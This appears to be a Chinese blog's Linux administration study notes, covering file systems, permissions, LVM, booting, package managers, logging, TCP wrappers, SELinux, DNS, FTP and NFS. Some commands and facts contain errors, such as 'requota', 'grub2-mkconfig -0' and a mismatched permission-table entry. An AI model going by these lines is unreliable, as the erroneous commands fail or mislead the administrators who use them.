概述\n文件是存储在硬盘上的，硬盘的最小存储单位叫做扇区sector，每个扇区存储512字节。操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个块block。这种由多个扇区组成的块，是文件存取的最小单位。块的大小，最常见的是4KB，即连续八个sector组成一个block。\n文件数据存储在块中，那么还必须找到一个地方存储文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种存储文件元信息的区域就叫做inode，中文译名为索引节点，也叫i节点。因此，一个文件必须占用一个inode，但至少占用一个block。\n\n\n元信息 → inode\n数据 → block\n\ninode\n\ninode表包括ext2,ext3或ext4文件系统上的所有文件列表\n\n\n\ninode(索引节点)时表的入口,包括文件信息(元数据)\n文件类型,许可权限,UID,GID\n链接数量(指向该文件的路径数目)\n文件大小和可变的时间戳\n文件数据在磁盘上的块指针\n文件的其他数据\n\n\n\n\nEXT3&#x2F;EXT4文件系统之日志的功能\n日志的作用\n在系统崩溃后,通过扫描日志文件就可以把文回复到一致的状态\n\n\n\n三种日志模式\n\n完整数据模式(Full Data)\n\n\n\n预定模式(Ordered)\n写回模式(WriteBack)\n\n磁盘配额(quota)\n\n在内核中实现配额\n\n\n\n在单个文件系统上实现\n\n针对每个用户或组具有单独的策略\n\n对块(blocks)或节点(inodes)的数量进行限制\n可以实现软限制或硬限制\n\n\n分区mount选项: usrquota, grpquota\n\n初始化数据库:\nquotacheck -cugm /filesystem\n\n为用户配额\n\n实现方法\n启用和停止Perez: quotaon, quotaoff\n直接修改配置:edquota, username\n\n\n\n\n\n从Shell设置:\nsetquota username 4096 5120 40 50 /foo\n\n定义模板用户\nedquota -p user1 user2\n\n配额状态报告\n\n用户审查: quota\n\n\n\n配额总览: requota\n\n访问控制列表(ACL)\nACL的定义及作用\n设置ACLs\n\nACLs\n\nACLs全称Access control lists(访问控制列表)\n用于对文件或者目录作做更精细控制\n\n\n\n\n\n主要通过三个方面控制资源\n\n拥有者\n拥有组\nmask\n\n\n命令:\nsetfacl -m/x[修改/删除] u/g/m/d[拥有者/拥有组/mask掩码/默认权限]:name file|directorysetfacl -m u:gandolf:rwx file|directory     setfacl -m g:anzgul:rw file|directorysetfacl -m m::rwx file|directorysetfacl -m d:u:frodo:rw directorysetfacl -x u:samwise file|directory\n\n使用mount选项实现\nmount -o acl /mountpoint\n\n在安装期间设置文件系统\ntunefs -l /dev/sda1 | grep options\n\n硬链接和软链接硬链接命令\n\n创建硬链接\nln filename [linkname]\n\n\n\n\n只要还有一个链接存在,文件就存在\n\n\n\n当链接数为零时,文件被删除\n不能跨硬盘分区\n\n软链接命令\nln -s filename linkname\n\n高级权限\nsuid\nsgid\nsticky bit\n\n\n含义\n\n在文件上的含义\nsuid: 命令运行时具有命令所有者拥权限,不是命令的执行者\nsgid: 命令运行时具有命令所在组权限的合并\n\n\n\n\n\n在目录上面的含义\nsgid: 在带有sgid为设置的目录下创建的文件又目录的组的权限的累加\nsticky bit: 带有sticky bit设置的目录,下面的文件只能被锁又这或者root用户删除,无论目录的写权限是啊如何设置的\n\n\n\n\n\n\n权限\n描述\n数字表示\n\n\n\ndrwsr-xr-x\n基本权限是 rwxr-xr-x 高级权限是 suid\n基本权限是 755 高级权限是 4 完整权限是 4755\n\n\ndrwSr-xr-x\n基本权限是 rwxr-xr-x 高级权限是 suid\n基本权限是 655 高级权限是 4 完整权限是 4655\n\n\ndrwxrwsr-x\n基本权限是 rwxrwxr-x 高级权限是 sgid\n基本权限是 775 高级权限是 2 完整权限是 2775\n\n\ndrwxrwSr-x\n基本权限是 rwxrw-r-x 高级权限是 sgid\n基本权限是 765 高级权限是 2 完整权限是 2765\n\n\ndrwxrwxrwt\n基本权限是 rwxrwxrwx 高级权限是 sticky\n基本权限是 777 高级权限是 1 完整权限是 1777\n\n\n符号法\n\n语法\nchmod [-R] mode file\n\n\n\nmode(模式)\n\nu,g或者o表示文件所属用户,组以及其他用户\n\n或者 - 表示允许或者禁止\n\n\ns和t表示高级权限\n\n\n示例:\nu+s:设置的是suidg+s:设置的是sgido+t:设置的是sticky bit\n\n数字法\n\n权限通过累加的方式来计算:\n4(suid) 2(sgid) 1(sticky)\n\n\n\n\n\n示例\nchmod 4775 file\n\n\n\n储存高级GTP(GIUD Partition Table): 全局唯一标识磁盘分区表\n\nGPT分区工具partedLVM\n\nLVM全称 Logical Volume Manager(逻辑券管理器)\n\n\n\n为了便于操作卷,包括重定义文件系统的大小,额定义的抽象层\n允许在多个五路设备上重新组织文件系统\n设备被认定为物理卷(PV)\n一个或多个物理卷可以用于创建成一个卷组(VG)\n卷组由固定大小的物理区域(PhysicalExten,PE)定义\n逻辑卷在卷组上创建按,并由PE组成\n文件系统创建在逻辑卷之上\n\nLVM工作模式\n\n非条带化(线性)\n\n\n\n条带化\n镜像\n快照\n\n调整逻辑卷大小\n\n扩展卷\nIvextend可以扩展逻辑卷\nresize2fs可以在联机或脱机状态下扩展ext4文件系统\n\n\n\n\n\n收缩卷\n必须在脱机状态下实施( umount )\n需要先进行文件系统校验( e2fsck )\n先收缩文件系统性( resize2fs )\n最后，lvreduce可用于收缩卷\n\n\n\n图形化X Window又叫做X11或X\n\n1987年X的第11版发行,即X11\n\n\n\n是基于网络的显示协议,提供了窗口功能,包含建立图形用户界面的标准工具和协议\nX Window是Linux的图形子系统\n开发X Window的团体:\nXFree86\nX.org\n\n\nXorg是红帽公司、普华公司用在X Window系统中的特定版本\n\nX Window的组成\n\n服务端\n\n\n\n客户端\n\n\n桌面环境\n\n在X图形系统基础上，桌面环境为计算机提供完全的图形用户界面(GUI)\n\n\n\n提供桌面环境解决方案的团体:\nGNOME\nKDE\nxfce4\nXDM\n…\n\n\n\n\n\nGUI\n\n\n\nX Window + Window Manager + Display Manager\n配置文件\n&#x2F;etc&#x2F;X11&#x2F;xorg.conf\nX -configure\n\n\n\n进程,线程,LWP\n\n进程是资源管理的最小单元；\n\n\n\n线程是程序执行的最小单元。\n轻量级进程(LWP)是建立在内核之上并由内核支持的用户线程，它是内核线程的高度抽象，每一个轻量级进程都与一个特定的内核线程关联。内核线程只能由内核管理并像普通进程一样被调度\n\n操作系的启动过程1,第一阶段:硬件引导\n\n\n备份:\ndd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D; &#x2F;tmp&#x2F;mbr. bak bs&#x3D;512 count&#x3D; 1\ndd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D; &#x2F;tmp&#x2F;mbr. bak bs &#x3D;446 count&#x3D;1\ndd if&#x3D;&#x2F;tmp&#x2F;mbr.bak of&#x3D;&#x2F;dev&#x2F;sda bs&#x3D;512 count&#x3D;1\ndd if&#x3D; &#x2F;tmp&#x2F;mbr .bak of&#x3D; &#x2F;dev&#x2F;sda bs&#x3D; 512 count&#x3D;1\n\n\n\n\n\n生成bootloader\ngrub-install &#x2F;dev&#x2F;sda\n\n\n\n2,第二阶段:加载管理启动程序\n\n\n&#x2F;boot&#x2F;grub&#x2F;grub.conf\n\n\n\n最小需求:\ntitle xxx\nroot (hdX,Y)\nkernel &#x2F;vmlinuz-version ro root&#x3D;根文件系统名称.\nKernel包含的文件\n&#x2F;boot&#x2F;vmlinuz -version\n&#x2F;boot&#x2F;initramfs-version.img\n&#x2F;lib&#x2F;modules&#x2F;\n\n\n\n\ninitrd &#x2F;initramfs-version.img\n\n\n\n3,第三阶段: 加载内核，并挂载根文件系统内核初始化\n\n启动期间内核功能\n设备检测\n设备驱动初始化\n以只读方式装载根文件系统.\n调入最初的进程( init )\n\n\n\n\n4,第四阶段: Sys V init初始化\n\n&#x2F;etc&#x2F;init&#x2F;rcS.conf\n\n\n\n&#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit\n重要的任务包括:\n激活udev和selinux\n设置&#x2F;etc&#x2F;sysctl.conf中定义的核心参数\n设置主机名\n启用交换分区\n根文件系统检查并且重装加载\n激活RAID和LVM设备\n启用磁盘限额管理\n检查并加载其它文件系统\n清除过期的锁和PID文件\n\n\n\n\n&#x2F;etc&#x2F;inittab\n&#x2F;etc&#x2F;rc.d&#x2F;rc[0-6].d\n&#x2F;etc&#x2F;init&#x2F;control-alt-delete.conf\n&#x2F;etc&#x2F;init&#x2F;tty.conf\n&#x2F;etc&#x2F;init&#x2F;serial.conf\n&#x2F;etc&#x2F;init&#x2F;prefdm.conf\n\n5,第五阶段: 完成启动系统故障排除Rescue\n\nRescue mode: 拯救模式,拯救系统\n用于修复操作系统的一个平台\n类似winPE,liveCD\n\n\n\n\n\n进入Rescue mode:\n通过光盘引导,PXE引导,制作USB引导等\n\n\n\n新Linux发行版GRUB2\n\n配置文件:\n&#x2F;boot&#x2F;grub2&#x2F;grub.cfg或&#x2F;boot&#x2F;efi&#x2F;EFI&#x2F;redhat&#x2F;grub.cfg\n\n\n\n\n\n生成配置文件:\ngrub2-mkconfig -0 &#x2F;boot&#x2F;grub2&#x2F;grub.cfg\n\n\n修改配置文件\n&#x2F;etc&#x2F;default&#x2F;grub\n\n\nGrub2 特性L:\n支持Intel , AMD , PowerPC架构\n支持固件类型: BIOS , EFI&#x2F;UEFI\n支持主引|导记录MBR和GPT\n支持非Linux文件系统:苹果的扩展分层文件系统( HFS+ )和微软的NTFS\n\n\n\ngdisk工具支持GPT格式\nArchlinux安装安装指南\n官方wiki安装指南 \npacman包管理器\n\npacman是archlinux包管理器，负责安装、删除和升级软件。\n\n\n\n它的最大亮点是将一-个简单的二进制包格式和易用的构建系统(ABS)结合。\npacman 软件仓库:\n在&#x2F;etc&#x2F;pacman.conf文件中定义使用的软件仓库，可以直接设置或从其它文件包含，只需要维护-一个列表。\n[core]提供了最基本的包，安装盘也提供有\n[extra]提供的是不适合[core] 库标准的软件包\n[community]提供的是由TU认证的AUR包\n\n\n\npacman常用命令\n\n安装指定的包:\npacman -S package_name….\npacman -S extra&#x2F;package_name\n\n\n\n\n\n安装包组:\npacman -S gnome\n\n\n升级软件包:\npacman -Syu\n\n\n查看那些包属于改组:\npacman -Sg gnome\n\n\n删除软件包,保留全部依赖关系:\npacman -R package_name\n\n\n删除软件包,仅保个别依赖关系:\npacman -Rs package_name\n\n\n删除软件包,不删除依赖该软件的其他程序:\npacman -Rdd package_name\n\n\n删除软件包,并删除所有依赖该软件的程序:\npacman -Rsc package_name\n\n\n查询可用的软件包:\npacman -Ss package_ name\n\n\n查询已安装的软件包:\npacman -Qs package_ name\n\n\n查询文件是由哪个软件包提供:\npacman -Qo filename\n\n\n查询软件包信息:\npacman -Si package_ name\n\n\n查询已安装软件包所包含的文件:\npacman -QI package name\n\n\n\n服务管理(systemd)\nsystemd 是一个 Linux 系统基础组件的集合，提供了一个系统和服务管理器，运行为 PID 1 并负责启动其它程序。功能包括：支持并行化任务；同时采用 socket 式与 D-Bus 总线式启用服务；按需启动守护进程（daemon）；利用 Linux 的 cgroups 监视进程；支持快照和系统恢复；维护挂载点和自动挂载点；各服务间基于依赖关系进行精密控制。systemd 支持 SysV 和 LSB 初始脚本，可以替代 sysvinit。除此之外，功能还包括日志进程、控制基础系统配置，维护登陆用户列表以及系统账户、运行时目录和设置，可以运行容器和虚拟机，可以简单的管理网络配置、网络时间同步、日志转发和名称解析等。\n\n更多有关systemd 的详细介绍.\nUbuntuubuntu是基于Debian GNU&#x2F;Linux，由全球化的专业开发团队(Canonical Ltd)打造的开源GNU&#x2F;Linux操作系统，发行周期为6个月。\nubuntu设计的目标ubuntu的目标是更多地的以用户为本以及桌面应用\nUbuntu风格\n\nubuntu提供的最新的、同时又相当稳定的主要由自由软件，附带一部分当今比较流行的第三方软件构建而成的操作系统\n\n\n\nubuntu对GNU&#x2F;Linux的普及特别是桌面普及作出了巨大贡献\n\nUbuntu 系统衍生版本\nUbuntu安装略\nUbuntu包管理器ubuntu派生自Debian,所以使用相同的包管理与仓库工具\ndpkg (Debian Package Management System)ubuntu&#x2F;Debian下的二进制软件包通常是以.deb格式发布的，使用dpkg进行软件管理，如安装、删除、查询等功能\n\n\n安装软件:\ndpkg -i packagename.deb\n\n\n\n删除软件:\ndpkg -r packagename\n\n查询软件包信息:\ndpkg –info packafename.debdpkg –status packagename\n\n查询软件包所含文件\ndpkg –listfiles packagenamedpkg –contents packagename.deb\n\n查询文件归属\ndpkg –search filename\n\n查询系统中的包\ndpkg –l\n\napt (Advanced Packaging Tool)apt是ubuntu&#x2F;debian及其派生发行版的软件包管理器，可以自动下载，配置，安装二进制或者源代码格式的软件包\n\n\n安装软件\napt-get install package\n\n\n\n删除软件\napt-get remove package\n\n查询软件包信息\napt-cache show package\n\n查询文件归属\napt-file search filename\n\n查询软件包所含文件\napt-file list package\n\n查询系统中的包\napt-cache pkgnames\n\napt前端程序aptitude: apt 的高级的字符和命令行前端aynaptic: 图形界面的apt前端dselect: 使用菜单界面的包管理工具gnome-apt: 图形界面的apt前端\nPPA (Personal Package Archives)PPA是ubuntu的私人软件仓库，允许用户上传原码包，由launchpad编译并发布作为apt的仓库\n命令行添加PPAsudo add-apt-repository ppa:user/ppa-namesudo apt-get updatesudo apt-get install package\n\n\n\n命令行删除PPAsudo add-apt-repository –remove ppa:user/ppa-name\n\n","categories":["笔记"],"tags":["笔记","云计算"]},{"title":"云计算 - Linux服务与安全","url":"/2023/04/27/cloud_linux_3/","content":"网络基础Socket 通讯\n所谓socket通常也称作”套接字” ,用于描述IR地址和端口,是一个通信链的句柄。应用程序通常通过”套接字”向网络发出请求或者应答网络请求。\n\n\nC&#x2F;S, B&#x2F;S架构C&#x2F;S（Client&#x2F;Server）：客户端-服务器结构\n\nC&#x2F;S结构在技术上很成熟，它的主要特点是交互性强、具有安全的存取模式、网络通信量低、响应速度快、利于处理大量数据。因为客户端要负责绝大多数的业务逻辑和UI展示，又称为胖客户端。它充分利用两端硬件，将任务分配到Client 和Server两端，降低了系统的通讯开销。C&#x2F;S结构的软件需要针对不同的操作系统系统开发不同版本的软件，加之产品的更新换代十分快，已经很难适应百台电脑以上局域网用户同时使用。\n\nB&#x2F;S（Browser&#x2F;Server）：浏览器-服务器结构，是目前应用系统的发展方向\n\nBS是伴随着Internet技术的兴起，对C&#x2F;S架构的改进，为了区别于传统的C&#x2F;S 模式，特意称为B&#x2F;S模式。在这种结构下，通过W3浏览器来进入工作界面，极少部分事务逻辑在前端（Browser）实现，主要事务逻辑在服务器端（Server）实现，形成三层（3-tier）结构。这样使得客户端电脑负荷大大简化（因此被称为瘦客户端），减轻了系统维护、升级的支出成本，降低了用户的总体成本（TCO）。\n\n\n\n\n系统架构\nC&#x2F;S\nB&#x2F;S\n\n\n\n配置成本\n高，客户机和服务器都需要配置软件\n低，只需配置服器，客户机只需安装浏览器\n\n\n维护更新成本\n高，服务器和客户机均要维护更新\n低，只维护更新服务器\n\n\n响应速度\n快,没有中间环节\n慢\n\n\n个性化定制\n强\n弱\n\n\n服务的基础linux下的服务管理有两类:\n\nSystem V 服务\nTransient 服务\n\nSystem V 服务System V， 曾经也被称为 AT&amp;T System V，是Unix操作系统众多版本中的一支。它最初由 AT&amp;T 开发，在1983年第一次发布。一共发行了4个 System V 的主要版本：版本1、2、3 和 4。System V Release 4，或者称为SVR4，是最成功的版本，成为一些UNIX共同特性的源头，例如 ”SysV 初始化脚本“ (&#x2F;etc&#x2F;init.d)，用来控制系统启动和关闭，System V Interface Definition (SVID) 是一个System V 如何工作的标准定义。\n\n\n通常被成为”System V” 或 “SysV”\n\n\n\n许多脚本都是用文件系统目录的格式来组织的\n可启用或者禁用资源服务\n经常使用几个配置文件\n大多数服务启动一个或多个进程\n命令被“包裹”在脚本中.\n服务由&#x2F;etc&#x2F;init.d&#x2F;目录中的脚本管理\n例如: &#x2F;etc&#x2F;init.d&#x2F;sshd status\nservice sshd status\n\n\n\nchkconfig\n\n管理运行级别中的服务定义\n\n\n\n在引导时启动cups服务: chkconfig cupS on\n不会改变System V服务的当前运行状态\n用于独立的和瞬时的服务\n被其它应用程序调用,其中包括system-config-services命令\n要列出服务在运行级别中的分配情况,需运行chkconfig –list 命令\n\n&#x2F;etc&#x2F;sysconfig文件\n\n用于配置服务的运行方式\n\n\n\nnamed\nsendmail\ndhcpd\nsamba\nsyslog\n\nTransient 服务\n\n瞬时( Transient )服务被xinetd进程所管理\n\n\n\n进入的请求首先被xinetd 代理\n\n配置文件&#x2F;etc&#x2F;xinetd.conf , &#x2F;etc&#x2F;xinetd.d&#x2F;service\n\n用chkconfig控制的服务:\nchkconfig tftp on\n\n计划任务\n\n一次性计划任务\n\n\n\n周期性计划认任务\n系统的\n用户的\n\n\nAnacron\n\n一次性计划任务\n\n包名: atd\n\n\n\n命令:\nat\nbatch - 当系统负载低于0.8时才运行\n\n\n按Ctrl+D完成\n\nat命令后需要跟上时间\n时间的表示方式:\n\n\nHH:MM\n\n\n\nmidnight - 12:00 a.m.\nnoon - 12:00 p.m.\nteatime - 4:00 p.m.\nMONTHDAYYEAR - 例如: January 15 2015\nMMDDYY - 例如: 011315\nnow + TIME - now + 5 days\n\n周期性的计划任务\n\n系统的- crontab\n\n\n\n用户的- crond\n创建:crontab -e\n查看:crontab -l\n删除:crontab -r\n\n\nAnacron运行那些在系统当机期间未执行的cron任务\n假定计算机不是连续运行的\n对笔记本电脑,工作站及其它非连续运行的系统来说很重要\n对需要临时停机的服务器也有作用\n\n\n配置文件: &#x2F;etc&#x2F;anacrontab\n字段1: 如果任务在指定的天数内没有运行\n字段2: 重启后在执行任务之前需要等待多久\n字段3: 任务标识符\n字段4: 需要运行的任务\n\n\n\nRsyslog 服务把日志集中存储在一个安全的地方, 通过日志分析系统的运行情况. Rsyslog全称”the Rocket-fast SYStem for LOG processing”,是一种应用于UNIX和Linux计算机系统在IP网络转发日志消息开源软件实用的程序。它实现了基本的syslog协议,扩展了基于内容过滤的过滤能力,丰富灵活的配置选项,并增加了诸如使用TCP传输的特点。\n\n\n格式: selector action\nselector : facility.level\nfacility : who or what\nlevel : when\n\n\naction :如何处理这些信息\n\n\n\n\nfolding cyan, Facility\n\n\n\nFacility Number\nKeyword\nFacility Description\n\n\n\n0\nkern\nkernel messages\n\n\n1\nuser\nuser-level messages\n\n\n2\nmail\nmail system\n\n\n3\ndaemon\nsystem daemons\n\n\n4\nauth\nsecurity&#x2F;authorization messages\n\n\n5\nsyslog\nmessages generated internally by syslogd\n\n\n6\nIpr\nline printer subsystem\n\n\n7\nnews\nnetwork news subsystem\n\n\n8\nuucp\nUUCP subsystem\n\n\n9\n\nclock daemon\n\n\n10\nauthpriv\nsecurity&#x2F;authorization messages\n\n\n11\nftp\nFTP daemon\n\n\n12\n\nNTP subsystem\n\n\n13\n\nlog audit\n\n\n14\n\nlog alert\n\n\n15\ncron\nclock daemon\n\n\n16\nlocal0\nlocal use 0 (local0)\n\n\n17\nlocal1\nlocal use 1 (local1)\n\n\n18\nlocal2\nlocal use 2 (local2)\n\n\n19\nlocal3\nlocal use 3 (local3)\n\n\n20\nlocal4\nlocal use 4 (local4)\n\n\n21\nlocal5\nlocal use 5 (local5)\n\n\n22\nlocal6\nlocal use 6 (local6)\n\n\n23\nlocal7\nlocal use 7 (local7)\n\n\nendfolding\nfolding cyan, Level\n\n\n\nCode\nSeverity\nDescription\nGeneral Description\n\n\n\n0\nEmergency\nemerg(panic)\nSystem is unusable\n\n\n1\nAlert\nalert\nAction must be taken immediately\n\n\n2\nCritical\ncrit\nCritical conditions\n\n\n3\nError\nerr(error)\nError conditions\n\n\n4\nWarning\nwarning(warn)\nWarning conditions\n\n\n5\nNotice\nnotice\nNormal but significant condition\n\n\n6\nInformational\ninfo\nInformational messages\n\n\n7\nDebug\ndebug\nDebug-level messages\n\n\nendfolding\n\n\n日志文件\n\n\n\n&#x2F;var&#x2F;log&#x2F;messages\n&#x2F;var&#x2F;log&#x2F;dmesg\n&#x2F;var&#x2F;log&#x2F;boot.log\n&#x2F;var&#x2F;log&#x2F;maillog\n&#x2F;var&#x2F;log&#x2F;secure\n&#x2F;var&#x2F;log&#x2F;lastlog - 记录所有用户的最近登录信息。要用lastlog命令查看\n&#x2F;var&#x2F;log&#x2F;btmp - 记录所有失败登录信息。用lastb命令查看\n&#x2F;var&#x2F;log&#x2F;wtmp - 记录正常登录系统的信息。用w命令查看\n\nLogrotate\n\n&#x2F;etc&#x2F;logrotate.conf\nweekly-每周rotate–次\nrotate 4 -保留四个日志文件\ncreate -创建一 个新的文件来存储日志\ncompress -保留的日志文件是否要压缩,文件太大可以启动该参数\nminsize 1M-日志文件容量超过1M后才进行rotate\n\n\n\n\nLogrotate 转发\n\n支持三种转发形式:\nUDP - @IP 1.1-1.1\nTCP - @@IP\nRELP - :omrelp:(最可靠)\n\n\n\n\n\n启用UDP\n$ModLoad imudp\n$UDPServerRun 514\n\n\n启用TCP\n$ModLoad imtcp\n$InputTCPServerRun 514\n\n\n$template TemplateName, “格式”, &lt; options&gt;\n引号模板:\n? TemplateName\n\n\n\nntpl (Network Time Protocol)\n\n时间同步使系统日志便于分析\n\n\n\n许多应用需要精确的时间\n如果没有校正，工作站的硬件时钟会随着时间逐渐产生漂移.\nNTP通过控制- -秒的长度来抵消时钟漂移\nNTP客户端应当配置三个时钟服务器\n配置文件: &#x2F;etc&#x2F;ntp.conf\n配置工具: system-config-date\n\nTcp-warppers\n服务和应用程序的访问控制\n服务特有的配置\n\n有些守护进程如httpd, smbd, squid等有自己的安全机制通用配置和libwrap.so相连接的所有程序都使用公共的配置文件因为xinetd和libwrap.so相连接,所以它的服务也受此影响检查主机和(或)远程用户名\n\n\ntcp_ wrappers配置\n\n检查访问权限的三三个步骤:\n访问被明确允许.了 吗?\n或者,访问被明确拒绝了吗?\n或者,默认设置是允许访问!\n\n\n\n\n\n配置被存放在两个文件里:\n&#x2F;etc&#x2F;hosts.allow文件里保存允许的访问\n&#x2F;etc&#x2F;hosts.deny文件里保存拒绝的访问\n\n\n基本语法:\ndaemon_ list: client list [:options]\n\n\n\n守护进程的说明\n\n守护进程名称:\n应用程序传递它们的可执行文件名称\n可以制定多个服务\n使用通配符ALL来匹配所有守护进程\n\n\n\n\n\n高级语法:\ndaemon@host: client_list …\n\n\n\n宏定义\n\n主机名宏定义\nLOCAL\nKNOWN, UNKNOWN, PARANOID\n\n\n\n\n\n主机和服务宏定义\nALL\n\n\nEXCEPT\n可用于客户和服务列表\n可嵌套\n\n\n扩展选项\n语法:\ndaemon_ list: client list [:opt1 :p2..]I\n\n\nspawn:\ncan be used to start additional programs\nspecial expansions are available (%C, %s)\n例如:\nin.telnetd: ALL : spawn echo “login attempt from %C to %s”| mail -S warning root\n\n\ndeny:\n可作为hosts.allow中的一个选项\n例如:\nALL: ALL: DENY\n\n\n\n\n\nSELinuxMAC VS DAC\n\nDAC- Discrentionary Access Control 自主访问控制\n权限\n拥有者、拥有组和其它人\n\n\n\n\n\nMAC - Mandatory Acess Control ( 强制访问控制)\n基于角色:\n一个组只代表一个或多个用户\n一个角色可以代表多个用户,也代表一个用户集可以执行的权限\n\n\n使用最小特权原则\n\n\n\n\nSELinux - Secutiry-Enhanced Linux基于内核级别的MAC\n\nSELinux是美国国家安全局( NSA&#x3D; The National Security Agency )和SCC( Secure Computing Corporation )开发的Linux的一一个扩张强制访问控制安全模块。\n\n\n\n\n所有文件和进程都具备“安全环境”( security context )\n\n\n\n环境包含几个元素,根据安全的需要使用不同的元素\nuser.role:type:sensitivity:category\nuser_ u:object r:tmp _t:s0:cO\n\n\n查看:\nls -Z (查看文件或目录)\nps -Z (查看进程)\n通常和其它选项配对使用,例如-ef\n\n\n\n\n\n\n\n\n登录名\nSELinux用户\nMLS范围\nService\n\n\n\ndefault\nunconfined_u\ns0-s0:c0.c1023\n*\n\n\nroot\nunconfined_u\ns0-s0:c0.c1023\n*\n\n\nsystem_ u\nsystem_u\ns0-s0:c0.c1023\n*\n\n\nrole\n\nobject_ r -定义系统中的文件的通用的角色,必须是拥有system_ r角色的程序才能访问\n\n\n\nsystem_ _r - - -般为进程的角色\n\n\n\n一组叫做”策略( policy)”的规则会决定控制的严格程度\n\n\n\n进程要么是被限制的(restricted) ,要么是无束缚的( unconfined)\n策略被用来定义被限制的进程能够使用哪些资源\n默认情况下将拒绝没有被明确允许的行为\n\nSecurity Level\n\nMLS - Multi-Lever Security (多等级安全)\n\n\n\nMLS未启用前:\nuser_ u:role r:type t\n\n\nMLS启用后:\nuser:role:type:sensitivity[:category…]- sensitivity [:category…]\n\n\nsecurity level由两部分组成\nsentitivity [ :category… ]\n\n\nsentitivity:\nsO\ns1\n…\n\n\ncategory:\nc0\n…\nc1023\n\n\n\nSELinux不能做什么?\n不能替代杀毒软件不能替代认证机制、防火墙或其它安全系统它不是集所有功能于一身的安全解决方案\n\n启用和关闭SELinux\n\n修改&#x2F;etc&#x2F;sysconfig&#x2F;selinux\n\n\n\n三种模式:\nenforcing -启动SELinux (策略生效,支持动态切换到permissive\npermissive-策略不生效,相当于disabled,但是支持动态切换到enforcing ,并且访问生成日志\ndisabled -关闭SELinux\n\n\n策略类型:\ntargeted :默认策略\nMLS\n\n\n\nBooleans\n\nBooleans :\nbooleans允许在运行时改变SELinux策略\n不必重新编译SELinux策略\n\n\n\n\n\n查看booleans:\ngetsebool -a\n\n\n设置booleans :\nsetsebool -P booleans_ name on|off(‘-P’:使修改值永久生效)\n\n\n\nDNS 服务DNS : Domain Name System\n\n\n常用的主机名称服务\n文件( &#x2F;etc&#x2F;hosts )\nDNS\n\n\n\n\n\n早期,使用HOSTS存储主机名到IP地址的映射,由SRI (Stanford Research Institute)斯坦福研究所的NIC (网络信息中心)负责维护，各个主机通过 FTP进行更新\n\nBind\n\n类型:系统V ( System V )管理的服务\n\n\n\n软件包: bind, bind-utils,bind-chroot\n守护进程: &#x2F;usr&#x2F;sbin&#x2F;named\n脚本: &#x2F;etc&#x2F;init.d&#x2F;named\n端口: 53 (domain)\n配置文件: &#x2F;etc&#x2F;named.conf, &#x2F;var&#x2F;named&#x2F;*\n相关软件包: openssl\nservice named configtest\nservice named start\nchkconfig\nnamed on\n\n区块文件结构\n\n资源记录都有五个字段) :\nJomain -被查询的域或子域)\nttl-记录被保存在缓存中的时间,以秒为单位\nclass -记录类别，(通常是IN)\ntype-记录类型,例如A或NS\nrdata一域映射的资源数据\n从概念上讲,用户会查询domain (域名) , 而domain则映射到rdata来查找答案\n\n\n\n\nSOA查询\n\nSOA ( Start Of Authority )记录将一 个服务器标记为主服务器\n\n\n\n初步观察结果\n域字段叫做始发地址\nrdata字段被引申为支持额外数据r 下-一个演示片对此进行了解释\n一般来说, -一个域通常有一 个主名称服务器,它保存数据的主要副本\n域或区块的其它规范性名称服务器被称为“从服务器”,它们会将其数据与主服务器同步\n\n\nSOA rdata\n主名称服务器的FQDN\n联系邮件地址\n序列号码\n在刷新序列号码之前刷新延迟时间\n从服务器的重试间隔\n当从服务器无法连接它的主服务器时，记录会过期\n否定性答复(“no such host”)的TTL最小值\n\n\n\n\n\n\n记录类型\n说明\n\n\n\nA\n主机地址记录\n\n\nCNAME\n别名\n\n\nMX\n接收邮件的服务器主机名\n\n\nNS\n域名服务器\n\n\nPTR\n反向查询记录\n\n\nSOA\n该区域数据的授权机构\n\n\nDNS 主从\n\n从区块说明\n\n\nzone &quot;example.com&quot;&#123;    type slave;    masters &#123; mymasters; &#125;;    file &quot;slaves/example.com.zone&quot;;&#125;;\n\n\n示范性区块说明:\n只想根据master选项中的主机的区块文件传送( AXFR和IXFR )\n将传送到的数据保存在&#x2F;var&#x2F;named&#x2F;slaves&#x2F;example.com.zone\n重载named自动创建文件\n\n\n\n访问控制列表(ACL)\n\n简单的说，ACL将一个名称分配给一个地址匹配列表\n\n\n\n一般可以用来代替匹配列表(允许嵌套! )\n最好的办法是在&#x2F;etc&#x2F;named.conf文件的开始处定义ACL\n声明示例\nacly”trusted {192.168.1.21; }\nacl “classroom” { 192.168.0.0&#x2F;24; trusted;};\nacl “cracker” { 192.168.1.0&#x2F;24; };\nacl “mymasters” { 192.168.0.254; };\nacl “myaddresses” { 127.0.0.1; 192.168.0.1; };\n\n\n内置ACL\nBIND预定义了几个ACL:\nnone - 不匹配任何IP地址\nany - 匹配所有IP地址\nlocalhost - 匹配名称服务的任何IP地址\n\n\n\n\n\nchrootbind-chroot软件包\n\n在&#x2F;var&#x2F;named&#x2F;chroot中安装chroot环境\n\n\n\n将现有的配置文件转移到chroot环境\n更新&#x2F;etc&#x2F;sysconfig&#x2F;named文件中named选项:\nROOTDIR&#x3D;&#x2F;var&#x2F;named&#x2F;chroot\n\n\n提示\n安装了bind-chroot软件包后查看&#x2F;etc&#x2F;sysconfig&#x2F;named\n启动了named后运行ps -ef| grep named来校验启动选项\n\n\n\nFTP 服务\nFTP软件\n\nVsftpd - Very Secure FTP Daemon\n非常安全\n\n\n\n\n\nPureftpd - the Pure FTP Daemon\n轻量级的\n快速的\n安全的口\n\n\nProftpd - the Popular FTP Daemon\n配置简单\n支持虚拟主机\n\n\nNcftpd\n高性能的\n\n\n\n文件传输协议(FTP) - vsftpd\n\nvsftpd -红帽企业版及普华Linux的默认ftp服务器\n不再由xinetd,管理，\n允许系统、匿名或虚拟(仅用于FTP服务)用户的访问\n匿名目录层次结构由vsftpd RPM提供\n&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf是主配置文件\n\n\n\n\nNFSNFS一Network File System允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源\nRPC- Romote Procedure Call该协议允许运行于一台计算机的程序调用另一台计算机的子程序\n\n\n类型:系统 V(System V)\n\n\n\n软件包: nfs-utils\n守护进程: rpc.nfsd, rpc.lockd, rpciod, rpc.mountd, rpc.rquotad, rpc.statd\n脚本: &#x2F;etc&#x2F;init.d&#x2F;nfs, 